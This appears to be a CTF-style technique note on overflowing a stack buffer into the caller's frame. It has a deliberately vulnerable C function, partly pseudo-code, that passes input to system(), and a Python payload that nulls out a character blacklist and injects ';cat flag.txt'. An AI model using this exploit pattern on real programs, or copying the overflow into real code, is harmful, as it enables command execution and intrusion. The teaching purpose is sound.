# Caller Frame Data Overwrite

**When:** A buffer overflow in one function can reach into the _caller's_ stack frame and corrupt local variables there — bypassing checks that use those variables.

**How it works:** The overflow from the inner function's buffer goes past its own frame (saved rbp, return address) into the caller's frame. If the caller has critical data there (like a blacklist of forbidden chars), overwriting it with benign bytes nullifies the check.

```c
void echo(char* blacklist, int blacklist_len) {
    char input[100];
    fgets(input, 0x100, stdin);      // overflow
    for (int i = 0; i < blacklist_len; i++)
        for (int j = 0; j < strlen(input); j++)
            if (input[j] == blacklist[i]) exit(-1);
    system("echo " + input);
}

int main() {
    char blacklist[] = "\"\'`|;{}!@#$%^&*()<>/\\:[]";
    echo(blacklist, sizeof(blacklist));
}
```

At a specific offset from `input[0]`, the bytes correspond to `main()`'s `blacklist` array. Overwrite it with null bytes so the check never matches:

```python
# Offset 144 = input start to blacklist in main's frame
# First 144 bytes: command injection + padding (no nulls)
# Bytes 144-168: 25 null bytes overwrite the blacklist
# strlen(input) returns 144 (stops at first null at byte 144)
# Blacklist check: for j in 0..143, if input[j] == 0x00 (no match)
payload  = b";cat flag.txt" + b"A" * (144 - len(b";cat flag.txt"))
payload += b"\x00" * 25                       # zero out blacklist
payload += b"B" * (0x100 - len(payload) - 1)  # fill rest
payload += b"\n"
```

The check passes because blacklist[i] = 0x00, and no input byte equals 0x00. The command injection in the first 144 bytes goes through `system("echo ;cat flag.txt...")` — and canary corruption doesn't matter because `system()` runs before the canary check.
